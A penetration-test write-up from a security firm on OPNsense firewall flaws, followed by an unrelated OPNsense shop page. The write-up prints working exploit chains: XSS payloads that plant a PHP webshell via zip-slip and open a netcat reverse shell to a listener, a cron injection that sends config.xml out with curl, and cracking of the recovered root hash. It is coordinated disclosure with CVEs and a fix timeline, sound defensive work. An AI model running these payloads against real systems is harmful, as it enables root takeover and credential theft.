=== Content from logicaltrust.net_e707a978_20250110_110505.html ===

Menu

[![](/images/logo.svg)](/en/)

* [Home](/en/)
* [Services](/en/#services)
* [Blog](/blog.html)
* [About us](/about.html)
* [Contact](#contact)

* [**EN**](/en/)
* [PL](/)

# [EN] A-Z: OPNsense - Penetration Test

Recently we performed a non-profit penetration test of [OPNsense](https://opnsense.org/) - an open source, FreeBSD based firewall and routing platform with ~51.47K active instances according to censys.io. The assessment was focused on web GUI and API as well as some parts of the system backend. Work has been carried out in a period from June 12 to June 26, 2023. In total, around 120 hours were committed to the project.

During the test we managed to find many interesting and varied vulnerabilities, e.g., Cross-Site Scripting, Cross-Site Request Forgery, Open Redirect, Insecure Permissions, OS Command Injection and Zip-Slip which eventually leads to root shell. You can find all of them in the [Full PDF Report](/pentest-reports/report-security-assessment-opnsense-1.0.pdf "LogicalTrust Penetration Tests Report of OPNsense") which is also a great example of what our commercial clients receive.

We would like to show you three scenarios of how vulnerabilities that we found could be chained together to perform attacks on the OPNsense instance.

# Scenario 1 - Reflected XSS leads to root RCE via Zip-Slip

In this scenario we used Reflected Cross-Site Scripting vulnerability (LT-0017) to deliver our payload to the administrator.
Sending GET request to `https://opnsense/ui/cron/item/open/0'+alert(window.origin)+'` would result in the following response:

```
<!doctype html>
<html lang="en-US" class="no-js">
  <head>
[...]
<script>
[...]
	openDialog('0'+alert(window.origin)+'');
[...]
```

After an administrator clicks on our link, we need to send six requests from their browser. First two requests create new Captive Portal template, another three enable Captive Portal with the selected template, and the last one spawns netcat reverse shell with our brand-new `luta.php` webshell.

### Example Javascript payload:

```
let requestData = {"name":"zipslip","content":"UEsDBAoAAAAAAJOO5VYdoS5KEAAAABAAAAA3ABwALi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vdXNyL2xvY2FsL3d3dy9sdXRhLnBocFVUCQADxZGlZPyPpWR1eAsAAQQAAAAABAAAAAA8Pz1gJF9HRVRbeF1gPz4KUEsDBAoAAAAAAEGO5VYAAAAAAAAAAAAAAAAEABwAY3NzL1VUCQADKpGlZCuRpWR1eAsAAQToAwAABOgDAABQSwMEFAAAAAgAMn7lVqx0FrPKAAAAvQEAAAwAHABleGNsdWRlLmxpc3RVVAkAA/B0pWSLkaVkdXgLAAEE6AMAAAToAwAAjY8xbsMwDEV3nYJAhk5RgN6gd+gFZJeSmVKiQdJRffvKKbpk8sjPx/8/L/C5kAGTOczSPFEz8AUhE2NLFY8pOdS0QxOHCUEeqF3JHRtM+xPeDBX6MoRZMTm1AvNmLhUc68rJ0WK4wAcz0FAMqI27/9wu7e3pPC4Uv/6WeNTJVOJP5SNGNoWso1AX/Q6z2W0ScXNNaxxTrGl9USu1YxPyeMtuhfd1oeFp1yVx5tHRropl46QRxc9g9ihnMPd8BuuST3Pv4f762t3CL1BLAwQKAAAAAABEjuVWAAAAAAAAAAAAAAAABgAcAGZvbnRzL1VUCQADL5GlZDCRpWR1eAsAAQToAwAABOgDAABQSwMECgAAAAAASo7lVgAAAAAAAAAAAAAAAAcAHABpbWFnZXMvVVQJAAM8kaVkQZGlZHV4CwABBOgDAAAE6AMAAFBLAwQKAAAAAABTjuVW5yL1pwQAAAAEAAAACgAcAGluZGV4Lmh0bWxVVAkAA06RpWSLkaVkdXgLAAEE6AMAAAToAwAAcG9jClBLAwQKAAAAAABPjuVWAAAAAAAAAAAAAAAAAwAcAGpzL1VUCQADRZGlZEaRpWR1eAsAAQToAwAABOgDAABQSwECHgMKAAAAAACTjuVWHaEuShAAAAAQAAAANwAYAAAAAAABAAAApIEAAAAALi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vdXNyL2xvY2FsL3d3dy9sdXRhLnBocFVUBQADxZGlZHV4CwABBAAAAAAEAAAAAFBLAQIeAwoAAAAAAEGO5VYAAAAAAAAAAAAAAAAEABgAAAAAAAAAEADtQYEAAABjc3MvVVQFAAMqkaVkdXgLAAEE6AMAAAToAwAAUEsBAh4DFAAAAAgAMn7lVqx0FrPKAAAAvQEAAAwAGAAAAAAAAQAAAICBvwAAAGV4Y2x1ZGUubGlzdFVUBQAD8HSlZHV4CwABBOgDAAAE6AMAAFBLAQIeAwoAAAAAAESO5VYAAAAAAAAAAAAAAAAGABgAAAAAAAAAEADtQc8BAABmb250cy9VVAUAAy+RpWR1eAsAAQToAwAABOgDAABQSwECHgMKAAAAAABKjuVWAAAAAAAAAAAAAAAABwAYAAAAAAAAABAA7UEPAgAAaW1hZ2VzL1VUBQADPJGlZHV4CwABBOgDAAAE6AMAAFBLAQIeAwoAAAAAAFOO5VbnIvWnBAAAAAQAAAAKABgAAAAAAAEAAACAgVACAABpbmRleC5odG1sVVQFAANOkaVkdXgLAAEE6AMAAAToAwAAUEsBAh4DCgAAAAAAT47lVgAAAAAAAAAAAAAAAAMAGAAAAAAAAAAQAO1BmAIAAGpzL1VUBQADRZGlZHV4CwABBOgDAAAE6AMAAFBLBQYAAAAABwAHAEsCAADVAgAAAAA="}
ajaxCall("/api/captiveportal/service/saveTemplate", requestData, () => {
	ajaxCall("/api/captiveportal/service/reconfigure", {}, () => {
		ajaxCall("/api/captiveportal/service/searchTemplates", {"current":1,"rowCount":7,"sort":{},"searchPhrase":"zipslip"}, (data, status) => {
			let requestData = {"zone":{"enabled":"1","interfaces":"lan","authservers":"Local Database","alwaysSendAccountingReqs":"0","authEnforceGroup":"","idletimeout":"0","hardtimeout":"0","concurrentlogins":"1","certificate":"","servername":"","allowedAddresses":"","allowedMACAddresses":"","transparentHTTPProxy":"0","transparentHTTPSProxy":"0","extendedPreAuthData":"0","template":data.rows[0].uuid,"description":"poc"}}
			ajaxCall("/api/captiveportal/settings/addZone/", requestData, () => {
				ajaxCall("/api/captiveportal/service/reconfigure", {}, () => {
					ajaxCall("/luta.php?x=rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>%261|nc 192.168.1.118 1337 >/tmp/f", null, null)
				})
			})
		})
	})
})
```

Above script can be base64 encoded and put inside the URL:

```
https://opnsense/ui/cron/item/open/0'+eval(atob('bGV0IHJlcXVlc3REYXRhID0geyJuYW1[...]gkJCQl9KQoJCQl9KQoJCX0pCgl9KQp9KQo='))+'
```

What’s interesting is that the application accepts templates in ZIP format, and then it extracts all of their contents to the template directory. However, the way in which the application extracts the files makes it vulnerable to the Zip-Slip attack (LT-0014):

```
# source: src/opnsense/scripts/OPNsense/CaptivePortal/overlay_template.py
with zipfile.ZipFile(input_data, mode='r', compression=zipfile.ZIP_DEFLATED) as zf_in:
    for zf_info in zf_in.infolist():
        if zf_info.filename[-1] != '/':
            target_filename = '%s%s' % (target_directory, zf_info.filename)
            file_target_directory = '/'.join(target_filename.split('/')[:-1])
            if not os.path.isdir(file_target_directory):
                os.makedirs(file_target_directory)
            with open(target_filename, 'wb') as f_out:
                f_out.write(zf_in.read(zf_info.filename))
            os.chmod(target_filename, 0o444)
```

By using `../` sequences it is possible to extract files to other directories. This allows us to extract PHP file to the web root - `/usr/local/www`.

Our ZIP archive looks like this, where `luta.php` is a simple PHP web shell:

```
Archive:  zipslip.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
       16  2023-07-05 17:52   ../../../../../../../../../../../usr/local/www/luta.php
        0  2023-07-05 17:50   css/
      445  2023-07-05 15:49   exclude.list
        0  2023-07-05 17:50   fonts/
        0  2023-07-05 17:50   images/
        4  2023-07-05 17:50   index.html
        0  2023-07-05 17:50   js/
---------                     -------
      465                     7 files
```

Since the PHP process is being ran as a root user, the shell is granted root privileges as well.

### Proof of Concept Video:

# Scenario 2 - Reflected XSS -> OS Command Injection -> root password retrieval via `config.xml` insecure permissions

In the second scenario the payload is also delivered through Reflected XSS, but this time the vulnerability is introduced in Certificates tab (LT-0002). Sending request to `https://opnsense/system_certmanager.php?act=%22%3E%3Csvg/onload=alert(window.origin)%3E&id=0` results in the following response body:

```
<!doctype html>
<html lang="en-US" class="no-js">
[...]
<form method="post" name="iform" id="iform"><input type="hidden" name="N3p4b1ZZUXpTc2VFWmFaLzRHQW5Ydz09" value="VUlyWVI0bWkyYkdjWDNvVGprQ1F2UT09" autocomplete="new-password" >
  <input type="hidden" name="id" id="id" value="0">
  <input type="hidden" name="act" id="action" value=""><svg/onload=alert(window.origin)>"/>
</form>
[...]
```

We want to send request to `/api/cron/settings/addJob/` in order to add new cron job. The application allows only specific commands to be executed via cron, however, by including single quotes (`'`) and newline character (`\n`) in the command parameters, we can define completely separate cron job and execute any command as `nobody` user (LT-0016).

### Example Javascript payload:

```
let requestData = {"job":{"enabled":"1","minutes":"*","hours":"*","days":"*","months":"*","weekdays":"*","command":"firmware auto-update","parameters":"'\n*\t*\t*\t*\t* curl -F config=@/conf/config.xml 192.168.1.118:1337 #'","description":"poc2"}}
setTimeout(() => {
	ajaxCall("/api/cron/settings/addJob/", requestData, () => {
		ajaxCall("/api/cron/service/reconfigure", {}, () => {
		})
	})
}, 1000)
```

…and turned into an URL:

```
https://opnsense/system_certmanager.php?act=%22%3E%3Csvg/onload=eval(atob(%27bGV0IHJlcXVlc3REYXRh[...]HsKCQl9KQoJfSkKfSwgMTAwMCk=%27))%3E&id=0
```

After the administrator opens the link, we can see our command added to the crontab:

```
root@OPNsense:~ # cat /var/cron/tabs/nobody
# DO NOT EDIT THIS FILE -- OPNsense auto-generated file
#
# User-defined crontab files can be loaded via /etc/cron.d
# or /usr/local/etc/cron.d and follow the same format as
# /etc/crontab, see the crontab(5) manual page.
SHELL=/bin/sh
PATH=/etc:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin
#minute	hour	mday	month	wday	command
# Origin/Description: cron/poc2
*	*	*	*	*	/usr/local/sbin/configctl -d firmware auto-update '
*	*	*	*	* curl -F config=@/conf/config.xml 192.168.1.118:1337 #'
```

In the above payload we are adding next vulnerability to the chain - even though we only have privileges of user `nobody`, insecure permissions (LT-0003) grant us read access to the configuration file:

```
root@OPNsense:/conf # ls -la
total 112
drwxr-xr-x   4 root  wheel    512 Jul 31 12:41 .
drwxr-xr-x  21 root  wheel   1024 Jul 31 12:44 ..
drwxr-xr-x   2 root  wheel   4096 Jul 31 14:13 backup
-rw-r-----   1 root  wheel  49152 Jul 31 12:41 captiveportal.sqlite
-rw-r--r--   1 root  wheel  39796 Jul 31 14:13 config.xml
-rw-r-----   1 root  wheel    383 Jul 31 12:41 dhcpleases.tgz
-rw-r-----   1 root  wheel     40 Jul 31 14:13 event_config_changed.json
drwxr-xr-x   2 root  wheel    512 Jul  5 12:40 sshd
```

Soon `config.xml` is sent to our listener:

```
feliks@debian ~> nc -lkp 1337
POST / HTTP/1.1
Host: 192.168.1.118:1337
User-Agent: curl/7.87.0
Accept: */*
Content-Length: 39119
Content-Type: multipart/form-data; boundary=------------------------06c60d07c2a2ae1e

--------------------------06c60d07c2a2ae1e
Content-Disposition: form-data; name="config"; filename="config.xml"
Content-Type: application/xml

<?xml version="1.0"?>
<opnsense>
  <theme>opnsense</theme>
  <sysctl>
[...]
    <user>
      <name>root</name>
      <descr>System Administrator</descr>
      <scope>system</scope>
      <groupname>admins</groupname>
      <password>$2y$10$YRVoF4SgskIsrXOvOQjGieB9XqHPRra9R7d80B3BZdbY/j21TwBfS</password>
      <uid>0</uid>
    </user>
[...]
```

Congratulations, it’s a bcrypt hash of a root password!

Finally, we feed it to `hashcat`:

```
feliks@debian ~> hashcat -m 3200 '$2y$10$YRVoF4SgskIsrXOvOQjGieB9XqHPRra9R7d80B3BZdbY/j21TwBfS' -a 0 wordlist.txt
hashcat (v6.1.1) starting...

[...]

$2y$10$YRVoF4SgskIsrXOvOQjGieB9XqHPRra9R7d80B3BZdbY/j21TwBfS:opnsense

Session..........: hashcat
Status...........: Cracked
Hash.Name........: bcrypt $2*$, Blowfish (Unix)
Hash.Target......: $2y$10$YRVoF4SgskIsrXOvOQjGieB9XqHPRra9R7d80B3BZdbY...1TwBfS
Time.Started.....: Mon Jul 31 17:04:47 2023 (0 secs)
Time.Estimated...: Mon Jul 31 17:04:47 2023 (0 secs)
Guess.Base.......: File (wordlist.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       10 H/s (3.82ms) @ Accel:2 Loops:64 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 6/6 (100.00%)
Rejected.........: 0/6 (0.00%)
Restore.Point....: 0/6 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:960-1024
Candidates.#1....: luta -> opnsense

Started: Mon Jul 31 17:04:13 2023
Stopped: Mon Jul 31 17:04:48 2023
```
# Scenario 3 - CSRF that halts the firewall

This one is quite straightforward. Administrator visits our website, from which we redirect them to `https://opnsense/api/core/system/halt`, to turn off the instance.
Normally, this request is made using POST method and requires CSRF token, but during the test it turned out that the app accepts GET request as well, and in such case doesn’t require CSRF token.

As a result, the OPNsense instance turns off.

### Proof of Concept Video:

# Closing thoughts

We reported found vulnerabilities to OPNsense maintainers and we really want to thank them for a great response. They handled the whole process very professionally, quickly prepared effective patches for many vulnerabilities and included them in the newest releases - [OPNsense 23.7 “Restless Roadrunner”](https://opnsense.org/opnsense-23-7-released/) as well as [business edition 23.4.2](https://docs.opnsense.org/releases/BE_23.4.html#august-04-2023). Also, they provided us with reasoning behind decision not to patch some of them right now.

We are very happy about the outcome of the tests and can’t wait to start another project like this soon. Stay tuned!

## Full list of found vulnerabilities

1. LT-0001: Using GET method to modify application state [CVE-2023-38999](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-38999)
2. LT-0002: Reflected Cross-Site Scripting - Certificates - act [CVE-2023-39002](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-39002)
3. LT-0003: Insecure directory permissions - /conf/ [CVE-2023-39004](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-39004)
4. LT-0004: Reflected Cross-Site Scripting - Log Files - /ui/diagnostics/log/core/ [CVE-2023-39000](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-39000)
5. LT-0005: Open Redirect - Login [CVE-2023-38998](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-38998)
6. LT-0006: Services run as root
7. LT-0007: Insecure temporary file storage - /tmp/ usage [CVE-2023-39003](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-39003)
8. LT-0008: Command injection - Backups - diag\_backup.php [CVE-2023-39001](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-39001)
9. LT-0009: Custom message injection - system\_usermanager.php
10. LT-0010: Improper error handling
11. LT-0011: Lack of input sanitization - crash\_reporter.php [CVE-2023-39006](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-39006)
12. LT-0013: Insecure permissions - configd.socket [CVE-2023-39005](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-39005)
13. LT-0014: Zip-slip in Captive Portal template upload leads to Remote Code Execution [CVE-2023-38997](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-38997)
14. LT-0015: Verbose error messages
15. LT-0016: Command injection - Cron - /api/cron/settings/setJob/ [CVE-2023-39008](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-39008)
16. LT-0017: Reflected Cross-Site Scripting - Cron - /ui/cron/item/open/ [CVE-2023-39007](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-39007)

## Timeline

* 27.06.2023 Vulnerabilities reported to OPNsense
* 27.06.2023 Report acknowledged
* 28.06 - 05.07.2023 Vendor fixed the vulnerabilities
* 12.07 Retest
* 17.07.2023 End of vulnerabilities disclosure process - reported issues are fixed or otherwise handled
* 31.07.2023 OPNsense 23.7 Released

Written on August 9, 2023 by
Feliks Penconek

## We invite you to contact us

through the following form:

**I agree to the processing of my personal data and sending the offer.**
Rules for the processing of personal data.

send

LogicalTrust sp. z o.o.
sp. k.

Stanisławowska 47
54-611 Wrocław, Poland, EU

NIP: 8952177980
KRS: 0000713515

**T.: +48 797 772 743**

**office@logicaltrust.net**
Key:   [PGP/GPG](/logicaltrust.gpg)

![LogicalTrust](/images/logo.svg)

copyright © 2007 - 2024 LogicalTrust

We support:
![las na zawsze - logo](/images/foundationlogo-lasnazawsze_a.png)
![unicef - logo](/images/foundationlogo-unicef_a.png)

×
## Rules for the processing of personal data.

According to art. 13 of the General Regulation on the Protection of Personal Data of 27 April 2016 (Official Journal EU L 119 of 04.05.2016) I inform that:

* **Data Administrator:** The administrator of your personal data is Logicaltrust sp. z o.o. sp. k., with its registered office at ul. Stanisławowska 47, 54-611 Wrocław, Tax Identification Number (NIP): 8952177980, National Business Registry Number (REGON): 369271084, National Court Register Number (KRS): 0000713515.
* **Contact with the Data Administrator:** You can contact the data administrator via email at: ado@logicaltrust.net or by traditional mail by sending a letter to the administrator's registered office address.
* **Purpose and Legal Basis for Processing Personal Data:** Your personal data will be processed by the data administrator for the purpose of responding to your inquiries, executing requested contact, taking actions prior to entering into a contract, performing the contract, establishing business relationships, presenting offers upon potential client's request (based on Art. 6(1)(a), (b), and (f) of the General Data Protection Regulation).
* **Data Processing Period:** Your personal data will be processed for the time necessary to clarify your matter and provide a comprehensive response. They will also be processed for the duration of cooperation and the contract (in this case, the data is processed as client data). In the event of non-cooperation, the data will be promptly deleted unless there is a need for further retention for the purpose of defense and protection against claims. In cases where the processing of personal data is based on voluntarily given consent according to Art. 6(1)(a) of the General Data Protection Regulation, you have the right to withdraw your consent at any time. The withdrawal of consent does not affect the lawfulness of processing based on consent before its withdrawal, in accordance with the applicable law.
* **Scope of Processed Data:** The scope of processed data includes: first name, last name, email, and phone number.
* **Recipients of Personal Data:** In specific situations, your personal data may be disclosed, for example, to fulfill a legal obligation or to exercise legally justified interests pursued by the data administrator or by a third party. The categories of recipients to whom the data administrator may disclose your personal data are entities or authorities authorized by law and service providers processing personal data on behalf of the data administrator based on data processing agreements (e.g., hosting company).
* **Data Transfers:** Your personal data will not be transferred outside the European Economic Area.
* **Rights and Entitlements:** You have the right to request access to your personal data, their correction, deletion, or processing limitations, as well as the right to object to data processing. You also have the right to file a complaint with the President of the Personal Data Protection Office (ul. Stawki 2, 00-193 Warsaw) if you believe that the processing of personal data violates data protection regulations.
* **Additional Information:** Providing data is voluntary, but failure to provide data necessary for correspondence may hinder the execution and maintenance of contact.

×
## Cookie policy

* 1. **About cookies** - Cookies are small data files, especially text files, which are stored by a server on your computer. With these files, your device will be recognized and, in consequence, the way a given website is presented will be adjusted to your personal preferences. Cookies usually contain the name of the website from which they originate, information on how long they have been stored on the device and a unique number.
* 2. **Which type of cookies do we use** - Session cookies – temporary files which are stored on your device until you log out from a given website or close the Internet browser. Persistent cookies – permanent files that remain on your device for a fixed period (specified in the parameters of the file) or until they are deleted manually. Third-party cookies – files that adjust the way a given website is presented to your personal preferences.
* 3. **Why do we use cookies?** - Cookies are used for the purpose of statistics, marketing and in order to adjust the contents of websites to the user's personal preferences. Cookies store information about geolocation, the visitor's language and random data about session identifiers. With the collected data, we are able to understand how exactly the visitor uses websites and, consequently, to improve their structure and content. The information received helps us to prepare statistics related to the number of new and regular users as well as enables us to analyze which pages are visited.
* 4. **How to use and how to disable cookies** - You can change the settings of your Internet browser at any time, so that it would block cookies or inform you when they are being sent. However, please note that if you do not accept the cookie policy, you may encounter some problems while using the website. The software used for searching websites accepts the cookies by default. The settings of an Internet browser can be changed, so that it would block cookies or inform the user each time when cookies are being sent onto his/her device. For more information on how to disable automatic saving of cookies, please check the settings of your Internet browser (the software used for searching Internet websites).

This page uses cookies. Click here to learn more. Accept Reject



=== Content from opnsense.com_81215c6f_20250110_110505.html ===

 [Skip to navigation](#site-navigation)
[Skip to content](#content)
[![OPNsense® Shop](https://shop.opnsense.com/wp-content/uploads/2020/09/cropped-OPNsense_logo_for_light_background_small_378x128px.png)](https://shop.opnsense.com/)
Search for:

Search

Menu

* [Home](https://shop.opnsense.com/)
* [Hardware](https://shop.opnsense.com/product-categorie/hardware-appliances/)
  + [DEC600 2.5GbE Series – OPNsense® Desktop Security Appliances](https://shop.opnsense.com/new-dec600-series-opnsense-desktop-security-appliances/)
  + [DEC700 Series – OPNsense® Desktop Security Appliance](https://shop.opnsense.com/dec700-series-opnsense-desktop-security-appliance/)
  + [DEC800 Series – OPNsense® Desktop Security Appliances](https://shop.opnsense.com/dec800-series-opnsense-desktop-security-appliance/)
  + [DEC2600 2.5GbE Series – OPNsense® Rack Security Appliance](https://shop.opnsense.com/new-dec2600-series-opnsense-rack-security-appliance/)
  + [DEC2700 Series – OPNsense® Rack Security Appliance](https://shop.opnsense.com/dec2700-series-opnsense-rack-security-appliance-2024-update/)
  + [DEC3800 Series – OPNsense® Rack Security Appliance](https://shop.opnsense.com/dec3800-series-update-2024/)
  + [DEC4200 Series – OPNsense® Enterprise & Datacenter Rack Security Appliance](https://shop.opnsense.com/dec4200-series-opnsense-enterprise-datacenter-rack-security-appliance/)
* [Software](https://shop.opnsense.com/product-categorie/software_and_licenses/)
* [Support](https://shop.opnsense.com/product-categorie/support/)
* [Services](https://shop.opnsense.com/product-categorie/professional_services/)
* [Login](https://shop.opnsense.com/mijn-account/)
  + [Account details](https://shop.opnsense.com/mijn-account/edit-account/)
  + [Addresses](https://shop.opnsense.com/mijn-account/edit-address/)
  + [Orders](https://shop.opnsense.com/mijn-account/orders/)
  + [Downloads](https://shop.opnsense.com/mijn-account/downloads/)
* EUR (€)
  USD ($)

* [Home](https://shop.opnsense.com/)
* [Hardware](https://shop.opnsense.com/product-categorie/hardware-appliances/)
  + [DEC600 2.5GbE Series – OPNsense® Desktop Security Appliances](https://shop.opnsense.com/new-dec600-series-opnsense-desktop-security-appliances/)
  + [DEC700 Series – OPNsense® Desktop Security Appliance](https://shop.opnsense.com/dec700-series-opnsense-desktop-security-appliance/)
  + [DEC800 Series – OPNsense® Desktop Security Appliances](https://shop.opnsense.com/dec800-series-opnsense-desktop-security-appliance/)
  + [DEC2600 2.5GbE Series – OPNsense® Rack Security Appliance](https://shop.opnsense.com/new-dec2600-series-opnsense-rack-security-appliance/)
  + [DEC2700 Series – OPNsense® Rack Security Appliance](https://shop.opnsense.com/dec2700-series-opnsense-rack-security-appliance-2024-update/)
  + [DEC3800 Series – OPNsense® Rack Security Appliance](https://shop.opnsense.com/dec3800-series-update-2024/)
  + [DEC4200 Series – OPNsense® Enterprise & Datacenter Rack Security Appliance](https://shop.opnsense.com/dec4200-series-opnsense-enterprise-datacenter-rack-security-appliance/)
* [Software](https://shop.opnsense.com/product-categorie/software_and_licenses/)
* [Support](https://shop.opnsense.com/product-categorie/support/)
* [Services](https://shop.opnsense.com/product-categorie/professional_services/)
* [Login](https://shop.opnsense.com/mijn-account/)
  + [Account details](https://shop.opnsense.com/mijn-account/edit-account/)
  + [Addresses](https://shop.opnsense.com/mijn-account/edit-address/)
  + [Orders](https://shop.opnsense.com/mijn-account/orders/)
  + [Downloads](https://shop.opnsense.com/mijn-account/downloads/)
* EUR (€)
  USD ($)

* [€0,00 0 items](https://shop.opnsense.com/winkelmand/ "View your shopping cart")

* ## NEW! OPNsense® Enterprise & Datacenter Security Appliances

  **Now with Dual Powe****r Supply and SFP28 [25Gbps]**

  [NEW! DEC4200 Series Enterprise & Datacenter Edition](https://shop.opnsense.com/dec4200-series-opnsense-enterprise-datacenter-rack-security-appliance/)
* ## OPNsense® Desktop Security Appliances

  [Checkout the brand new DEC800 Series](https://shop.opnsense.com/dec800-series-opnsense-desktop-security-appliance/)
* ## OPNsense® Rack Security Appliances

  [Checkout the brand new DEC3800 Series](https://shop.opnsense.com/dec3800-series-update-2024/)
* # Because **Your Business** depends on **IT**

  ![](https://shop.opnsense.com/wp-content/uploads/2020/09/OPNsense_BE_Box-266x300.png)

  [The benefits](https://shop.opnsense.com/product/opnsense-business-edition/)
* | **ET PRO TELEMETRY RULESET** The content of the ET PRO RULESET in exchange for your anonimized telemetry data. IF YOU CARE TO SHARE OUR BEST OFFER IS FREE Your participation helps stop emerging threats! (Requires OPNsense) |  | **ET PRO RULESET** A timely and accurate rule set for detecting and blocking advanced threats using your existing network security appliances. PLATFORM INDEPENDENT AND SURICATA OPTIMIZED The best **platform independent** commercial intrusion detection rules available. Available in **SNORT** & **Suricata** formats |
  | --- | --- | --- |

  | [Sign up for free](/product/etpro-telemetry/) |  | [Buy Now](/product/proofpoint-et-pro-ruleset-1yr-subscription/) |
  | --- | --- | --- |

##### FREE SHIPPING

Free shipping  on all EU orders above EUR 200 excluding tax.

##### SUPPORT

Contact us during business hours.

##### 30 DAYS RETURN

Return within 30 days for a full refund.\*

##### 100% SECURE PAYMENTS

All payments processed securely.

(\*=Offer valid for single unit purchases, hardware only.)

---

* [![Hardware](https://shop.opnsense.com/wp-content/uploads/2021/02/Cat_Hardware_V3-324x324.jpg)
  ## Hardware (25)](https://shop.opnsense.com/product-categorie/hardware-appliances/)
* [![Software & Licenses](https://shop.opnsense.com/wp-content/uploads/2020/09/software_and_licenses-324x324.png)
  ## Software & Licenses (15)](https://shop.opnsense.com/product-categorie/software_and_licenses/)
* [![Support](https://shop.opnsense.com/wp-content/uploads/2020/09/support-324x324.png)
  ## Support (6)](https://shop.opnsense.com/product-categorie/support/)
* [![Professional Services](https://shop.opnsense.com/wp-content/uploads/2020/09/support_and_services-324x324.png)
  ## Professional Services (5)](https://shop.opnsense.com/product-categorie/professional_services/)

* [![DEC3842 - OPNsense® Rack Security Appliance](https://shop.opnsense.com/wp-content/uploads/2023/12/DEC3800-Product_full-324x324.jpg)
  DEC3842 – OPNsense® Rack Security Appliance](https://shop.opnsense.com/product/dec3842-opnsense-rack-security-appliance/)
  €1.399,00
  [Select options](https://shop.opnsense.com/product/dec3842-opnsense-rack-security-appliance/)
* [![DEC2770 - OPNsense® Rack Security Appliance](https://shop.opnsense.com/wp-content/uploads/2023/12/DEC2770-PRODUCT-IMAGE-324x324.jpg)
  DEC2770 – OPNsense® Rack Security Appliance](https://shop.opnsense.com/product/dec2770-opnsense-rack-security-appliance/)
  €1.399,00
  [Select options](https://shop.opnsense.com/product/dec2770-opnsense-rack-security-appliance/)

* [![DEC750 - OPNsense® Desktop Security Appliance](https://shop.opnsense.com/wp-content/uploads/2021/11/DEC7XX-opnsense-324x324.jpg)
  DEC750 – OPNsense® Desktop Security Appliance](https://shop.opnsense.com/product/dec750-opnsense-desktop-security-appliance/)
  €899,00
  [Select options](https://shop.opnsense.com/product/dec750-opnsense-desktop-security-appliance/)
* [![DEC740 - OPNsense® Desktop Security Appliance](https://shop.opnsense.com/wp-content/uploads/2021/11/DEC7XX-opnsense-324x324.jpg)
  DEC740 – OPNsense® Desktop Security Appliance](https://shop.opnsense.com/product/dec740-opnsense-desktop-security-appliance/)
  €799,00
  [Select options](https://shop.opnsense.com/product/dec740-opnsense-desktop-security-appliance/)
* [![DEC840 - OPNsense® Desktop Security Appliance](https://shop.opnsense.com/wp-content/uploads/2021/02/A20-Desktop-324x324.jpg)
  DEC840 – OPNsense® Desktop Security Appliance](https://shop.opnsense.com/product/dec840-opnsense-desktop-security-appliance/)
  €1.099,00
  [Select options](https://shop.opnsense.com/product/dec840-opnsense-desktop-security-appliance/)

* [![DEC3852 - OPNsense® Rack Security Appliance](https://shop.opnsense.com/wp-content/uploads/2023/12/DEC3800-Product_full-324x324.jpg)
  DEC3852 – OPNsense® Rack Security Appliance](https://shop.opnsense.com/product/dec3852-opnsense-rack-security-appliance/)
  €1.699,00
  [Select options](https://shop.opnsense.com/product/dec3852-opnsense-rack-security-appliance/)
* [![DEC4240 - OPNsense® Rack Security Appliance](https://shop.opnsense.com/wp-content/uploads/2023/07/DEC4240_product_picture.png)
  DEC4240 – OPNsense® Rack Security Appliance](https://shop.opnsense.com/product/dec4240-opnsense-rack-security-appliance/)
  €3.499,00
  [Select options](https://shop.opnsense.com/product/dec4240-opnsense-rack-security-appliance/)
* [![DEC850 - OPNsense® Desktop Security Appliance](https://shop.opnsense.com/wp-content/uploads/2021/02/A20-Desktop-324x324.jpg)
  DEC850 – OPNsense® Desktop Security Appliance](https://shop.opnsense.com/product/dec850-opnsense-desktop-security-appliance/)
  €1.599,00
  [Select options](https://shop.opnsense.com/product/dec850-opnsense-desktop-security-appliance/)

* [Sale
  Product on sale

  ![OPNsense Business Edition (3Yr)](https://shop.opnsense.com/wp-content/uploads/2020/12/OPNsense_BE_2020_3Yr-324x324.jpg)
  OPNsense Business Edition (3Yr)](https://shop.opnsense.com/product/opnsense-business-edition-3yr/)
  ~~€447,00~~ Original price was: €447,00.€399,00Current price is: €399,00.
  [Add to cart](?add-to-cart=1179)
* [![OPNsense Business Support Subscription](https://shop.opnsense.com/wp-content/uploads/2020/12/OPNsense_Business-_Support_Subscription-324x324.jpg)
  OPNsense Business Support Subscription](https://shop.opnsense.com/product/opnsense-business-support-subscription/)
  €329,00  / year
  [Sign up now](?add-to-cart=771)
* [Sale
  Product on sale

  ![4 Hours Extra Support (Subscribers only)](https://shop.opnsense.com/wp-content/uploads/2020/12/OPNsense_4_hours_block-324x324.jpg)
  4 Hours Extra Support (Subscribers only)](https://shop.opnsense.com/product/4-hours-extra-support-subscribers-only/)
  ~~€658,00~~ Original price was: €658,00.€599,00Current price is: €599,00.
  [Select options](https://shop.opnsense.com/product/4-hours-extra-support-subscribers-only/)
* [![OPNsense® on Azure](https://shop.opnsense.com/wp-content/uploads/2020/09/azure-opnsense-logo-324x324.jpg)
  OPNsense® on Azure](https://shop.opnsense.com/product/opnsense-on-azure/)

  [Get it on Azure](https://azuremarketplace.microsoft.com/en-us/marketplace/apps/decisosalesbv.opnsense)

